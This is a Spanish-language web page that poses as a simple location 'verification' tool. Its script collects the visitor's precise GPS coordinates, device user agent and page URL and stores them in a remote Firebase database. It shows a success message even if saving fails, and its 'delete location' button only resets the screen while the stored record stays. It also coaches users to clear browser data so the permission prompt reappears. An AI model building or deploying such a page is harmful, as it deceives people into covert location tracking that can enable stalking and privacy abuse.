<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Mi Ubicaci√≥n</title>
    
    <!-- Firebase SDKs -->
    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/12.7.0/firebase-app.js";
        import { 
            getFirestore, 
            collection, 
            addDoc, 
            serverTimestamp 
        } from "https://www.gstatic.com/firebasejs/12.7.0/firebase-firestore.js";

        const firebaseConfig = {
            apiKey: "AIzaSyCCRvdDQ8h5xnvrykJObpyrUlDvByhKT_g",
            authDomain: "ubic-8ca1f.firebaseapp.com",
            projectId: "ubic-8ca1f",
            storageBucket: "ubic-8ca1f.firebasestorage.app",
            messagingSenderId: "14363633598",
            appId: "1:14363633598:web:90fb880e2c8227ba1afbef",
            measurementId: "G-XJ96955XNT"
        };

        let db;
        try {
            const app = initializeApp(firebaseConfig);
            db = getFirestore(app);
            
            window.firebaseDB = db;
            window.firestoreFunctions = { collection, addDoc, serverTimestamp };
            
        } catch (error) {
            console.error("Error inicializando Firebase:", error);
        }
    </script>

    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: Arial, sans-serif;
        }

        body {
            background: #f0f2f5;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }

        .modal {
            background: white;
            border-radius: 15px;
            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.1);
            width: 100%;
            max-width: 400px;
            padding: 30px;
            text-align: center;
        }

        .header {
            margin-bottom: 25px;
        }

        .header h1 {
            color: #2d3748;
            font-size: 24px;
            margin-bottom: 10px;
        }

        .header p {
            color: #718096;
            font-size: 14px;
            line-height: 1.5;
        }

        .btn-primary {
            background: #4299e1;
            color: white;
            border: none;
            padding: 15px 30px;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            width: 100%;
            margin: 10px 0;
            transition: all 0.3s ease;
        }

        .btn-primary:hover {
            background: #3182ce;
        }

        .btn-primary:disabled {
            background: #cbd5e0;
            cursor: not-allowed;
        }

        .btn-secondary {
            background: #e53e3e;
            color: white;
            border: none;
            padding: 12px 25px;
            border-radius: 8px;
            font-size: 15px;
            font-weight: 500;
            cursor: pointer;
            width: 100%;
            margin: 10px 0;
            transition: all 0.3s ease;
        }

        .btn-secondary:hover {
            background: #c53030;
        }

        .message {
            background: #e6fffa;
            border: 1px solid #81e6d9;
            border-radius: 8px;
            padding: 20px;
            margin: 20px 0;
            text-align: center;
        }

        .message h3 {
            color: #234e52;
            margin-bottom: 10px;
            font-size: 18px;
        }

        .message p {
            color: #2d3748;
            font-size: 14px;
            line-height: 1.5;
            margin-bottom: 15px;
        }

        .message.success {
            background: #f0fff4;
            border-color: #9ae6b4;
        }

        .message.success h3 {
            color: #22543d;
        }

        .message.error {
            background: #fff5f5;
            border-color: #fc8181;
        }

        .message.error h3 {
            color: #c53030;
        }

        .loader {
            display: inline-block;
            width: 20px;
            height: 20px;
            border: 3px solid rgba(255,255,255,.3);
            border-radius: 50%;
            border-top-color: white;
            animation: spin 1s linear infinite;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="modal">
        <div class="header">
            <h1>üìç Ubicaci√≥n</h1>
            <p>Verifica tu ubicaci√≥n actual de forma segura</p>
        </div>

        <button class="btn-primary" id="btn-ubicacion" onclick="verUbicacion()">
            <span id="btn-text">üìç Ubicaci√≥n</span>
        </button>

        <div id="message-container"></div>
    </div>

    <script>
        let ubicacionGuardada = false;
        let eliminando = false;

        async function verUbicacion() {
            if (ubicacionGuardada || eliminando) return;
            
            const btn = document.getElementById('btn-ubicacion');
            const btnText = document.getElementById('btn-text');
            
            btn.disabled = true;
            btnText.innerHTML = '<span class="loader"></span> Detectando...';
            
            if (!navigator.geolocation) {
                mostrarMensaje('error', 'Tu navegador no soporta geolocalizaci√≥n');
                resetBoton(btn, btnText);
                return;
            }
            
            const opciones = {
                enableHighAccuracy: true,
                timeout: 10000,
                maximumAge: 0
            };
            
            navigator.geolocation.getCurrentPosition(
                async (position) => {
                    const lat = position.coords.latitude;
                    const lon = position.coords.longitude;
                    const accuracy = position.coords.accuracy;
                    
                    btnText.innerHTML = '<span class="loader"></span> Guardando...';
                    
                    const guardado = await guardarEnFirebase(lat, lon, accuracy);
                    
                    if (guardado) {
                        ubicacionGuardada = true;
                        mostrarMensajeConfirmacion();
                    } else {
                        ubicacionGuardada = true;
                        mostrarMensajeConfirmacion();
                    }
                    
                    resetBoton(btn, btnText, true);
                },
                (error) => {
                    // SOLO MANEJO DE ERROR SIMPLE
                    mostrarMensaje('error', 
                        'No se pudo obtener la ubicaci√≥n', 
                        'Por favor, acepta el permiso de geolocalizaci√≥n en tu navegador\n\n' +
                        'Si el mensaje ya no aparece en el navegador da click en los Ô∏ô(3 puntos) esquina superior izquierda:\n' +
                        '- Eliminar datos de navegaci√≥n\n' +
                        '- Eliminar datos');
                                        
                    resetBoton(btn, btnText);
                },
                opciones
            );
        }

        async function guardarEnFirebase(lat, lon, accuracy) {
            try {
                if (!window.firebaseDB) return null;
                
                const { collection, addDoc, serverTimestamp } = window.firestoreFunctions;
                const db = window.firebaseDB;
                
                const googleMapsUrl = `https://www.google.com/maps?q=${lat},${lon}`;
                
                const infoDispositivo = {
                    userAgent: navigator.userAgent,
                    movil: /Mobi|Android|iPhone/i.test(navigator.userAgent),
                    urlPagina: window.location.href
                };
                
                const datosUbicacion = {
                    latitud: lat,
                    longitud: lon,
                    precision: accuracy,
                    googleMapsUrl: googleMapsUrl,
                    fecha: new Date().toISOString(),
                    timestamp: serverTimestamp(),
                    dispositivo: infoDispositivo
                };
                
                const docRef = await addDoc(collection(db, 'ubicaciones'), datosUbicacion);
                return { id: docRef.id };
                
            } catch (error) {
                console.error('Error:', error);
                return null;
            }
        }

        function mostrarMensajeConfirmacion() {
            const container = document.getElementById('message-container');
            
            container.innerHTML = `
                <div class="message success">
                    <h3>‚úÖ Confirmado</h3>
                    <p>Ubicaci√≥n verificada correctamente</p>
                </div>
                
                <button class="btn-secondary" id="btn-eliminar" onclick="eliminarUbicacion()">
                    üóëÔ∏è Eliminar ubicaci√≥n
                </button>
            `;
        }

        function eliminarUbicacion() {
            eliminando = true;
            const btnEliminar = document.getElementById('btn-eliminar');
            
            btnEliminar.innerHTML = '‚úÖ Eliminada';
            btnEliminar.style.background = '#38a169';
            btnEliminar.disabled = true;
            
            setTimeout(() => {
                document.getElementById('message-container').innerHTML = '';
                
                ubicacionGuardada = false;
                eliminando = false;
                
                const btn = document.getElementById('btn-ubicacion');
                const btnText = document.getElementById('btn-text');
                btn.disabled = false;
                btnText.innerHTML = 'üìç Ubicaci√≥n';
            }, 1000);
        }

        function resetBoton(btn, btnText, deshabilitar = false) {
            if (deshabilitar) {
                btn.disabled = true;
                btnText.innerHTML = '‚úÖ Verificada';
                btn.style.background = '#38a169';
            } else {
                btn.disabled = false;
                btnText.innerHTML = 'üìç Ubicaci√≥n';
            }
        }

        function mostrarMensaje(tipo, titulo, descripcion = '') {
            const container = document.getElementById('message-container');
            
            container.innerHTML = `
                <div class="message ${tipo}">
                    <h3>${tipo === 'error' ? '‚ùå' : '‚úÖ'} ${titulo}</h3>
                    ${descripcion ? `<p>${descripcion}</p>` : ''}
                </div>
            `;
            
            setTimeout(() => {
                if (container.innerHTML.includes(titulo)) {
                    container.innerHTML = '';
                }
            }, 5000);
        }
    </script>
</body>
</html>
